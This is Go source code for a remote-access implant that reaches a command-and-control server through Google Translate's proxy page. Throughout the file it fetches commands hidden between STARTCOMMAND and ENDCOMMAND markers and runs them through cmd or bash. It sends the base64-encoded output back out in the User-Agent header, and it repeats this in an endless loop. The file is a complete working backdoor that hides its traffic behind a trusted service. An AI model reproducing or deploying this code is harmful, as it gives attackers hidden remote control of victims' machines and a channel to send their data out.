package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/antchfx/htmlquery"
	"golang.org/x/net/html"
	"golang.org/x/net/html/charset"
)

type requestData struct {
	url       string
	userAgent string
	method    string
}

var (
	C2URL     string
	USERAGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
	RESULT    string
)

func xpathParser(html *html.Node, xpath string) string {
	a := htmlquery.FindOne(html, xpath)
	return htmlquery.InnerText(a)
}

func Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func parseCommand(command string) string {
	if strings.Contains(command, "STARTCOMMAND") {
		startIndex := strings.Index(command, "STARTCOMMAND")
		endIndex := strings.Index(command, "ENDCOMMAND")
		return command[startIndex+len("STARTCOMMAND") : endIndex]
	} else {
		return ""
	}
}

func doRequest(request requestData, printar bool) (*html.Node, error) {
	client := http.Client{}
	req, err := http.NewRequest(request.method, request.url, nil)
	req.Header.Add("User-Agent", request.userAgent)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	r, err := charset.NewReader(resp.Body, resp.Header.Get("Content-Type"))
	if err != nil {
		return nil, err
	}
	return html.Parse(r)
}

func interact(request requestData) *html.Node {
	resp, err := doRequest(request, false)
	if err != nil {
		fmt.Println(err)
	}
	return resp
}

func translateFlow() string {
	return thirdStep(secondStep(firstStep()))
}

func firstStep() string {
	request := requestData{
		url:       "https://translate.google.com/translate?&anno=2&u=" + C2URL,
		userAgent: USERAGENT,
		method:    "GET",
	}
	result := xpathParser(interact(request), "//iframe/@src")
	return result
}

func secondStep(url string) string {
	request := requestData{
		url:       url,
		userAgent: USERAGENT,
		method:    "GET",
	}

	result := xpathParser(interact(request), "//a/@href")
	return result
}

func thirdStep(url string) string {
	var useragent string
	if len(RESULT) != 0 {
		useragent = RESULT
	} else {
		useragent = USERAGENT
	}

	request := requestData{
		url:       url,
		userAgent: useragent,
		method:    "GET",
	}

	var b bytes.Buffer
	html.Render(&b, interact(request))
	return parseCommand(b.String())
}

func execCommand(cmd string) {
	var output []byte
	if runtime.GOOS == "windows" {
		output, _ = exec.Command("cmd", "/c", cmd).Output()
	} else {
		output, _ = exec.Command("bash", "-c", cmd).Output()
	}

	RESULT = USERAGENT + " | " + Encode(output)
	translateFlow()
}

func main() {
	args := os.Args
	if len(args) < 3 {
		log.Fatal("Usage Error\n" + args[0] + " www.c2server.ml secret-key")
	}
	key := args[2]
	C2URL = "http://" + args[1] + "/?key=" + key
	for {
		execCommand(translateFlow())
		RESULT = ""
	}
}
